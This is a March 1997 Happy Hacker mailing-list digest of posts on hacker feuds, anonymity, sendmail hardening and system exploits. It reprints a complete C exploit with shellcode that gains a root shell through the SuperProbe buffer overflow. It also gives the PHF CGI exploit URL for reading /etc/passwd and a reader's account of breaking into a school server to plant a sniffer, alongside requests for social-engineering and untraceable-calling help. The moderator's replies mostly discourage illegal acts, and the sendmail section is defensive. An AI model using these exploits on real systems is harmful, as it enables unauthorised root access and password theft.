@@ -1,0 +1,581 @@
+Happy Hacker Digest March 21-22 1997 
+====================================================================== 
+      This is a moderated list for discussions of *legal* hacking. 
+                      Moderator: Carolyn Meinel
+                 
+            OR to the Hackers forum: http://www.infowar.com 
+Digest archives are held under the "New" button at the Infowar site
+
+               Please don't send us anything you wouldn't 
+              email to your friendly neighborhood narc, OK?
+
+        To subscribe or unsubscribe, 
+  use the subscribe boxes on the menu bars, please.. If you decide  you just want to use the forum and not get these mailings, we promise 
+       our feelings won't get hurt if you unsubscribe from this list. 
+                       H a p p y  h a c k i n g ! 
+================================================================= 
+URLs 'O the Day: ftp://info.cert.org/pub/cert_advisories/CA-97.08.innd 
+http://www.math.pub.ro/security 
+=================================================================
+
+Table of Contents:
+
+o  GALF Attack News 
+o  Netscape Hacking 
+o  Mail Bomb Protection 
+o  Staying Anonymous 
+o  Call for Hong Kong, Japanese Hackers 
+o  PHF Script Exploit 
+o  IRC 
+o  Linux Exploit 
+o  Telnet vs Telenet 
+o  Windows Hacking 
+o  FTP Restriction Question
+
+==================================================================== 
+GALF  (Gray Areas Liberation Front) Attack News 
+====================================================================
+
+Anonymous post:
+
+Hi, I submitted a post a few days ago and got your "obscene GALF 
+reply"  I must assume that they now know who I am and being in the 
+sec/ tech business myself have now become concerned by the fact that 
+I may become a potential target. I can not afford this sort of 
+buzzkill.  Nor do I take lightly to this kind of political 
+vigilantism.  We all have a right to say what we think and this must 
+not be prevented by anyone. The actions of GALF are similar to those 
+used by military dictatorships to maintain fear and intimidation in 
+their regimes. We are currently in the process of organizing 
+a SAD (seek and destroy) response team to deal with these Internet SS 
+creeps. We will at least keep these guys on their toes, stay on their 
+trail and at least force them to operate under the same air of 
+paranoia and fear that their (victims) have to live with.
+
+No information about this team will be stored on computers. 
+You may contact us by mail at 1705 14th St. suite 354 Boulder CO 80302 
+Please include a phone number so we can contact you back. 
+ We accept mail from GALF victims and elite's who want to join our 
+team.  We would also love to hear from the cowards at GALF if they 
+want to talk about it before it's too late.
+
+Carolyn: I know the  person who posted this message and have verified it. If you are serious about doing something about GALF, please use this address as your point of contact.  While I am totally against throwing harmless hackers in jail, what GALF is doing is not hacking, but criminal activity.
+
+-----------------------------------------------------------------------
+
+Sender: cyoung@northernnet.com
+
+Is the editor of G.A.L.F a female or how many people are in that group? or how long have they been around? sorry for the questions...I've put a page about them on my page...just wanted some more background info on them if I could? my ISP did not like them tampering with my email...or did not like them trying to tamper with it *grins*! so now my ISP is laughing there heads off at the page I made of galf!  just wandering if you could give me some info such as how many of there is or who is the editor of there group?
+
+i went to there page and it SUCKS!
+
+not one decent thing on there page!
+
+thanks much... 
+                      ______________________________________________ 
+                     #define url= http://www.northernnet.com/cyoung 
+        #define handle= GR8GUY/LITTLE BOY 
+        #define os= Win95 
+        #define age= 18 
+void main() 
+{ 
+ printf("to IBM's"); 
+}
+
+Carolyn: That Web page of yours is a great idea. Making phun of the lusers who abuse hacking the way GALF does is much more constructive than retaliating with illegal attacks on computer systems. It's more fun, too. The great thing is that Gilboa and GALF have atrophied senses of humor, so this is a battle we can easily win.
+
+As for the sex, numbers and identities of GALF, heck, I don't know. But my understanding is that Netta Gilboa herself is not a hacker, but rather the rallying point for GALF.
+
+If GALF comes roaring in to attack your ISP on account of your Web page bait, please make sure the sysadmins are prepared to gather forensics under difficult circumstances. GALF has gotten pretty good at hiding their presence in the log files.
+
+------------------------------------------------------------------------
+
+Sender: david.boyda@virgin.net
+
+hi happy hackers, 
+          I was reading with interest about the GALF group and 
+their crusade for the destruction of the happy hacker mailing list, these 
+guys seem serious, and I can understand why the moderator might not to 
+retaliate. But what the heck, I reckon that we should, like let's blast 
+them from @escape.com, and see how they like it, two can play that game. 
+There must be enough of us to start an attack, show them who`s boss, but 
+I guess that's against the happy hacker ethics??.
+
+Anyway I have a question , has any one every used `Claymore` to attack a 
+word Xcel password?. If so them please email me, and give some info on how 
+to set it up.
+
+thanks.
+
+LazEdawg..........
+
+greetings from Derry............
+
+Carolyn: Arrgghhhh, we just make the warfare on the Internet worse when we act just like the GALF guys.  If you are serious on finding a way to control them, let's start by gathering information. I do *not* want any self-styled knights in shining armor using illegal tactics to try to rescue me from GALF. I do *not* want anyone going to jail on account of something they did to help out this list.
+
+----------------------------------------------------------------------
+
+Sender: ghost.of.xmas.past@boulder.Colorado.EDU
+
+GALF may be cool but they cross the line. They have no honor and they have no code. 
+They act like conquerors not like citizens, they show no respect for mutual expression and freedom to say what one pleases. Genius does not grant you the right to emulate those that you hate.  If GALF is so great they ought to focus on more worthwhile tasks like messing with the Illuminati or corrupt governments or at least the super wealthy who show no regard.  Don't harass your peers when there are those who oppress you all around.    DUH?
+
+The ghost of xmas past
+
+=================================================== 
+Netscape Hacking 
+===================================================
+
+Sender: r00t@post1.com
+
+To stop cookies in Netscape, simply change the attributes of the 
+cookies.txt file to read only.  Bingo, no more stupid cookie acceptance 
+messages, and no more stored cookie data.
+
+                                            dark dante 
+----------------------------------------------------------------------
+
+Sender: dagashi@emails.com
+
+>Carolyn: But if you play around some with Netscape you will see it doesn't 
+>behave that much like a shell. It's pretty good for opening text files in an 
+>appropriate word processor, but you can't get it to run other kinds of 
+>applications.
+
+Dear Carolyn, 
+ You are wrong.  Utterly wrong.  Netscape and any other browser 
+compromise the system that runs Microsoft Crap.  You can run any program 
+from within Netscape.  How you ask?  A very simple way to do it is by 
+going up to "Options" pulling down to "General Preferences" and going to 
+"Apps".  From there you can just enter the location of whatever 
+application you want to run "C:\Command.com" in any of the spaces (I 
+utilized TELNET) and it is set up to run. "OK" out of the dialog boxes 
+and get back to the browser.  In the URL box, open "telnet:" and your 
+program is run.  Simple ways for simple people  =)  I used this little 
+diddy to get into my school's NT server's system and set up a sniffer. 
+Ahh, and life was good until I got caught, now I am banned from 
+computers at school.  Oh well.
+
+----------------------------------------------------------------------
+
+Sender: candyman@voicenet.com
+
+I was wondering if anybody knows a way to change the animated logo (top 
+left corner) of Netscape and IE browsers.  I know it's possible because AT&T and Quicken and other companies did that, well at least to the Netscape browser. 
+So if somebody figures how to do it please post it on this list.
+
+candyman 
+I Am A Force Of Pure Destruction !!
+
+======================================================= 
+Mail Bomb Protection 
+=======================================================
+
+Sender: bbuster@succeed.net
+
+How to Protect Your Server From Being Used For Mail Bombing or Spammers 
+----------------------------------------------------------------------- 
+This is a Technophoria Release - www.technophoria.com - 
+-----------------------------------------------------------------------
+
+OK, here it is right from Sendmail's "cookbook". How to set up protection on your system to make people less likely, or sometimes impossible, to use your system as a middle man in a mail bombing/spamming.
+
+First things first, assess your system, or the one being used as the middle man. First ask yourself, does sendmail need to be running in the first place? Most middle man servers are systems that are not being used as anything more than a router or gateway and can have their sendmail daemons "kill -HUP" foiling the attempt right off the bat. If you need sendmail running, here are some tips to keep them from using it. First, some real easy steps: If you are running any sendmail prior to V8.7, upgrade; that will help right off the bat.
+
+For any version you should check the source code to make sure that 
+"PICKY_HELO_CHECK" is Enabled, and that "PICKY_QF_NAME_CHECK" is also 
+enabled. I don't want to go into a lesson in programming, but if you look carefully when you boot your system and it says starting up sendmail, you see all kinds of switches after it. These switches are different configurations, configurations you might need to change. The "PICKY" commands are found under the "PrivacyOptions" (-q switch) in the code of the configuration file, this is the file it checks every time it's booted.
+
+The "PICKY_HELO_CHECK" looks to see if when the remote host connects, if 
+when they use the "HELO" command that their host matches the name of the 
+calling machine. You might want to watch this option though because some 
+systems use names other then their canonical names (virtual hosted domains). 
+Most config files come with this option NOT enabled for that reason. If the match is wrong, sendmail will not accept the mail from the calling host as it thinks it's being spoofed. Another alternative is the other option, the "PICKY_QF_NAME_CHECK".
+
+"PICKY_QF_NAME_CHECK" option, when enabled in the configuration file, will do much the same thing as the "PICKY_HELO_CHECK" but will accept the mail and deliver it. If the names do not match however, it will queue the name and write it to an error file for you to later look over and determine if this was a spam/bombing. This is a much more useable option to the first because as you will see, you can make great use of this information.
+
+In the configuration file under the PrivacyOptions, the code would look like 
+this when the are ENABLED:
+
+ENVDEF= -DPICKY_HELO_CHECK 
+ or 
+ENVDEF= -DPICKY_QF_NAME_CHECK
+
+OK, you have either played it super safe and blocked out half the Internet, or you are using the Log to track possible offenders. Now what? Now you want to reconfigure your mail headers to give more information than is default. You can change in the config file, or with a command line switch, the PrivacyOptions settings. There are various settings, but the BEST and SAFEST one is the "PrivacyOptions=goaway". With this set, you ENABLE ALL the "X-Authenication-Warings". These setting make sure that all connections use the HELO command, if an Alias is used, it uses the EXPN command to find the real users name, if it's a list, it will use the VRFY command to. It will use most all of sendmail's functions to try and get the real hosts name with message ID. If it still thinks it is being faked, or is being faked, it will insert into the header the "X-Authenication-Warning" that tells you when, where, and who was trying to fake or spoof the header/e-mail. In addition to this, it also help secure your system from Sendmail hacks and probes.
+
+Anyone with half a brain will realize after getting cough a few times by 
+their intended targets, and by you, to stop bombing or stop using your 
+server. What if they don't quit? What if they are extra stupid? Well now you set up a little data base from the error file you got from the 
+"PICKY_QF_NAME_CHECK" you enabled earlier. From this data base you are going to block "user@hosts.***" by user or domain, from using your server. How it's done: lets say you call this file "badguys", and it's in the /etc/mail/directory (/etc/mail/badguys). Set it up like so:
+
+user@host.***  bomb      <--- this is if you want to keep track of each 
+user@host.***  spam      <--/ 
+ 
+
+You add all the users/domain you want into the initial file. You want to 
+make it a database (a hash db) file you use the command:
+
+# makemap hash /etc/mail/badguys.db < /etc/mail/badguys
+
+Once you got the database set up, you need to edit your config file once 
+again. Under the LOCAL_CONFIG line you want to add the following:
+
+Kbadguys hash -o /etc/mail/badguys.db
+
+This will effectively block the users you put on the list and bounce the mail back to them. This is effective against spammers who configure their header to leave out their "From" portion of the header, and mail bomb programs that use a set fake user id (like the Unabomber is set to be Kazinski@unabomb.org) or bombers who use the same fake user@host every time.
+
+There are a Million different ways to set up sendmail and a Million different ways to get around the best planned security features, but if you plan and watch, you can stop 99% of spams/bombing from going through your server in a matter of a few months. There are no quick fixes (save turning off your system, giving up and going home) to this problem so all you can do is try to cope, get educated and keep one step ahead. The Sendmail book from O'Reilly and Associates is THE book that EVERY SysAdmin should have; I highly recommend it to anyone who wants to know more about sendmail and how it works as it covers everything anyone ever wanted to know about it. 
+ 
+
+Regards                       \__ ^^ __/ 
+   BB                            X  X 
+                                 \  / 
+                                  \/ 
+  
+              //\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\ 
+             // The one and only true "Bronc Buster!!!"  \\ 
+            //\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\ 
+-= One line AWK command that show users with no password or Superusers =- 
+cat passwd | awk -F: 'NF !=7 || $3 == 0 || $2 == ""{printf $1 " " $2 " " $3}' 
+          \\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\// 
+                         bbuster@succeed.net 
+                    http://www2.succeed.net/~bbuster 
+                     Ringmaster - Fringe of the Web 
+         www.infected.com - The Infected - Infecting young minds
+
+================================================= 
+Staying Anonymous 
+=================================================
+
+From: "Michael Paul" <mbp@locke.ccil.org>
+
+I don't know what the big deal is with staying anonymous...  has anyone 
+heard of anonymous remailers?  They're basically servers that take your 
+message and resend it, with "Anonymous" as the name of the server.  Check out http://www.stack.nl/~galactus/remailers/index-anon.html to see what I mean.  They're not very good for mailbombing, however, because if some sysadmin sees a few thousand messages from the same source coming through the server, he's likely to reveal the sender or ban the sender's server from using the remailer.
+
+To surf the web anonymously, use www.anonymizer.com.  It loads a file on 
+the Web and sends it to you, without you ever having to connect to the Webserver.  This prevents recording of who you are by the Web server; logs show "anonymizer.com".
+
+One question I still have, though - I have a program that spoofs identd 
+replies.  Is this enough to stay anonymous on IRC and Telnet?
+
+Michael Paul 
+mbp@locke.ccil.org
+
+-----------------------------------------------------------------------
+
+Sender: jopee@mozcom.com
+
+>From: Niraj Bhatt <bhootnath@juno.com>
+
+>To keep yourself anonymous (almost), there are several services on the 
+>Internet that will give you a free e-mail address.
+
+>Forwarding Services:
+
+>NetAddress - http://netaddress.usa.net/ 
+>BigFoot - http://www.bigfoot.com/ 
+>iName - http://four11.iname.com/  OR   http://www.iname.com
+
+I think it would be worth pointing out that one should be careful when 
+using these services - a few mail forwarding systems operate a finger 
+server through which anyone can find out your email address simply by 
+fingering your so called anonymous addy.
+
+----------------------------------------------------------------------
+
+Sender: dc-stuff@dis.org 
+From: William Knowles <erehwon@c2.net>
+
+Young Kittrich can't be a fed otherwise he would already know 
+that anonymous remailers and the people who operate them are 
+the scourge of the earth (Unless he's a FBI/SAIC/NSA plant) 
+and that would be another story. :)
+
+Nevertheless, The best site for information on anonymous remailers 
+and their latency, and reliability would be Raph Levien's site at:
+
+http://www.cs.berkeley.edu/~raph/remailer-list.html
+
+Since in the last week a couple of remailers shut down, One of 
+which was likely influenced by a visit by some of Kittrich's 
+friends at the DoJ because of some abuse of the remailer I would 
+like you to point your browsers to the Winsock Remailer page
+
+http://www.cyberpass.net/~winsock
+
+Where you too can be the first on your block to run a remailer! 
+The winsock remailer runs on Windows 95 and on 3.1 and you don't 
+have to know Unix to operate it.
+
+Lastly, There is Joel McNamara's site for Private Idaho which now 
+offers source code for those who think that PGP and crypto in 
+general have backdoors for the NSA to read your encrypted mail.
+
+Private Idaho offers excellent help in chaining remailers to make 
+traffic analysis a real pain in the ass, and encrypting your 
+messages with PGP, Since no one really wants to fart around with 
+commands like PGP -seat C:\pictures\flame.jpg   Just to send a 
+picture without your parents or boss, Janet Reno finding out 
+all about it. %)
+
+http://www.eskimo.com/~joelm 
+ 
+
+Cheers!
+
+William Knowles 
+erehwon@c2.net
+
+Carolyn: The above is reprinted from the dc-stuff email list. To subscribe, email majordomo@dis.org with message "subscribe dc-stuff"
+
+---------------------------------------------------------------------
+
+Sender: stergidu@eexi.gr
+
+I would very much like to know how I can get files by ftpmail and remail 
+untraced, since many ftp servers demand the email address as password. 
+And my second question is , if the above problem is bypassed (through 
+your help), how do I get the file (I maybe wrongly assume it was sent 
+elsewhere.) 
+Thanks for bothering. 
+Finally how do I END my elementary Unix commands after following your 
+lessons about fingering at another computer's port 
+My address is :stergidu@aurora.eexi.gr 
+ 
+
+===================================================== 
+Call for Hong Kong, Japanese Hackers 
+=====================================================
+
+Sender: KGB@rubikon.net.pl 
+Hackers from HonkKong & Japan, please email-me.
+
+Kris
+
+>>>--  IRC: CyberKris; mailto: KGB@rubikon.net.pl  -->>> 
+Smith & Wesson - The original point and click interface 
+~~~~~~  Member  of  Harmless  Maniacs  Club  ~~~~~~ 
+http://www.rubikon.net.pl/~celestyn/maniak/
+
+================================================ 
+PHF Script Exploit 
+================================================
+
+Anonymous post:
+
+Hi Carolyn, 
+           Recently there has been quite a discussion on the PHF script 
+that gets you the passwd file on servers that use this script. The passwd file is not the only reward, this flaw can be used to do almost anything on a server (even get root). 
+I have played around a lot with this bug and I am amazed at the laxity and negligence of the sysop. However getting to the point. 
+This is what the exploit looks like: 
+http://"name of server"/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd 
+Now, if one were to simply replace the 'cat' command with another command (use your imagination) then he/she can accomplish a lot. 
+Simply remember that %20 signifies a space. 
+I really love this bug because just about anyone who knows a little about Unix can make it bigtime with this bug. 
+Bye
+
+=================================================== 
+IRC 
+===================================================
+
+Sender: dschwarz@earthlink.net@hungary-c.it.earthlink.net
+
+Happy Hacker, 
+    I have a question about IRC. I was on your chat channel today and 
+encounter something called a script. My questions is what are they, 
+how do you make them?
+
+======================================================= 
+Linux Exploit 
+=======================================================
+
+Sender: ham@CLUV.UNIVALLE.EDU.CO 
+Sender: Bugtraq List <BUGTRAQ@NETSPACE.ORG>
+
+Hi!
+
+SuperProbe is a program supplied with XFree86 (to determine the type of video hardware installed in the machine), and it is installed setuid root in many Linux distributions. It has already been discussed here that SuperProbe got some buffer overflows, but there still seems to be no exploit. The reason for this might be that the exploit has to be a bit unusual. That's why I decided to post the exploit, as an example of exploiting an overflow without dealing with the return address.
+
+The overflow I'm exploiting is in the TestChip function:
+
+> static Bool TestChip(chip_p, Chipset) 
+> Chip_Descriptor *chip_p; 
+> int *Chipset; 
+> { 
+>     char *p, *p1, name[64];
+
+[...]
+
+>                 (void)strcpy(name, p); 
+>             } 
+>             if (StrCaseCmp(name, chip_p->name) == 0)
+
+[...]
+
+>     if (chip_p->f(Chipset)) 
+>     { 
+>         return(TRUE); 
+>     } 
+>     return(FALSE); 
+> }
+
+Chip_Descriptor is defined like this:
+
+> typedef Bool (*ProbeFunc) __STDCARGS((int *));
+
+[...]
+
+> typedef struct { 
+>         char            *name;          /* Chipset vendor/class name    */ 
+>         ProbeFunc       f;              /* Probe function               */
+
+[...]
+
+> } Chip_Descriptor;
+
+It is possible to overwrite the return address by the strcpy, but one byte of chip_p would get zeroed out (since chip_p is located right after the return address, and the string is ASCIIZ). This would cause the program to crash when trying to access chip_p->name for passing it to StrCaseCmp, before the return address is used.
+
+That's why I overwrite chip_p to point into an environment variable (well, the  return address gets overwritten also, but it's never used), which has an array of pointers to the shellcode (located at the end of the same variable's value)in it. One of these is first used by StrCaseCmp, so it doesn't crash, and the next one is used as the probe function pointer, so the shellcode gets executed when calling chip_p->f() (it might be required to adjust the alignment in my exploit, try values 0 to 3 if the default doesn't work).
+
+Signed, 
+Solar Designer
+
+==============================superprobe-exploit.c========================= 
+/* 
+ * SuperProbe buffer overflow exploit for Linux, tested on Slackware 3.1 
+ * © (c) 1997 by Solar Designer 
+ * 
+ * NOTE: if this doesn't work, change the alignment from 0 to 1, 2, or 3. 
+ * 
+ */ 
+ 
+
+#include <stdio.h> 
+#include <stdlib.h> 
+#include <unistd.h>
+
+#define alignment 0
+
+char *shellcode = 
+  "\x31\xc0\xb0\x31\xcd\x80\x93\x31\xc0\xb0\x17\xcd\x80\x68\x59\x58\xff\xe1" 
+  "\xff\xd4\x31\xc0\x8d\x51\x04\x89\xcf\x89\x02\xb0\x2e\x40\xfc\xae\x75\xfd" 
+  "\x89\x39\x89\xfb\x40\xae\x75\xfd\x88\x67\xff\xb0\x0b\xcd\x80\x31\xc0\x40" 
+  "\x31\xdb\xcd\x80/" 
+  "/bin/sh" 
+  "0";
+
+char *get_sp() { 
+  asm("movl %esp,%eax"); 
+}
+
+#define bufsize 8192 
+char buffer[bufsize];
+
+main() { 
+  int i;
+
+  for (i = 0; i < bufsize / 2; i += 4) 
+    *(char **)&buffer[i] = get_sp() - 2048; 
+  memset(&buffer[bufsize / 2], 0x90, bufsize / 2); 
+  strcpy(&buffer[bufsize - 256], shellcode); 
+  setenv("SHELLCODE", buffer, 1);
+
+  memset(buffer, 'x', 72); 
+  *(char **)&buffer[72] = get_sp() - 6144 - alignment; 
+  buffer[76] = 0;
+
+  execl("/usr/X11/bin/SuperProbe", "SuperProbe", "-nopr", buffer, NULL); 
+}
+
+Carolyn: The above was reprinted from the Bugtraq list. To subscribe, email listserv@netspace.org with message "subscribe bugtraq."
+
+========================================================== 
+Telnet vs Telenet 
+==========================================================
+
+Sender: jopee@mozcom.com
+
+What's D difference between TELENET & TELNET?
+
+Carolyn: There is an excellent discussion on this under the Telenet topic at our Hackers forum at http://www.infowar.com.
+
+Sender: HoThEaTZip@aol.com
+
+I love this Happy Hackers List.  I am a newbie with a pretty good 
+understanding of computers.  Questions:
+
+1)  OK, Telenet is the safest place to hack, right? 
+2)  How do I find my dial up to Telenet?  (I am in area code 713.) 
+3)  How can I redirect calls so I can't be traced.  (I don't want to take any 
+chances.)
+
+Thanx.  Answering these questions will help me drastically.
+
+Carolyn: Easy and safe are not the same thing. Telenet it easy to hack. But it's still not legal, so if you abuse it you may get in trouble. The kinds of things you might do to cover up from where you call will only compound your trouble if you get caught. The simplest and legal way to phone without being traced is the old-fashioned, yes, pay phone.
+
+======================================================= 
+Windows Hacking 
+=======================================================
+
+Sender: nk@xtasy.prestel.co.uk
+
+>From: Adam Christopher <mjolnir@thor.pla-net.net> 
+ 
+
+>1. Does anyone know where I can find an assembler for DOS?  I've been 
+>all over looking for one, but I can't find any.
+
+I have a copy of TASM , released by Borland in 1990. Its a very small file and I'll put it on my web site. the URL for the program is 
+http://www3.cybercity.hko.net/islamabad/nk/files/tasm.zip 
+ 
+
+-------
+
+-NK
+
+nk@DeathsDoor.com  (UK)        nk@xtasy.prestel.co.uk (UK) 
+nick@paknet1.ptc.pk  (PAK)       nk@support.graffiti.net (HK)
+
+Finally I've got my own mailing list - xtasy@graffiti.net ! 
+Email listerver@graffiti.net with the command SUBSCRIBE XTASY in the mail 
+body
+
+ FreeWare, ShareWare, WebWare, CustomWare, HumorWare, 
+ RaisingHares, Don'tLikeBears, WhatToWear, DoYouCare, TruthOrDare, 
+ LosingHair, LegsByNair, DoneWithFlair, SenseIsRare, We'llSeeYouThere -- 
+ <http://www3.cybercity.hko.net/islamabad/nk/>
+
+Taize on paknet2.ptc.pk 7777         (&)        irc.dal.net 7000
+
+----------------------------------------------------------
+
+Sender: jopee@mozcom.com
+
+From GTmHH Hacking from Windoze... 
+>Now if you wanted to be a really evil hacker you could call that 800 number 
+>and try to social engineer a password out of somebody who works for this 
+>network. But that wouldn't be nice and there is nothing legal you can do 
+>with ans.net passwords. So I'm not telling you how to social engineer those 
+>passwords.
+
+Could U give me a hint on how to do it?
+
+====Netcop 1.7
+
+I used Netcop to scan. What does it mean if I don't get an answer after 
+scanning port 0 to 256. Does this mean there are no open ports? What about 
+port 25, it should be open, shouldn't it. 7hankz.
+
+=================================================== 
+FTP Restriction Question 
+=================================================== 
+Sender: young@freenet.edmonton.ab.ca
+
+My ISP only lets me have ftp access between 2 am and noon. This is quite 
+annoying so I was wondering... Can I get ftp access through the FTP port? 
+I can connect to port 21 and it says FTP port. If I can get FTP access 
+through it how do I do it? And is this illegal?
+
+Thank you, 
+J Young 
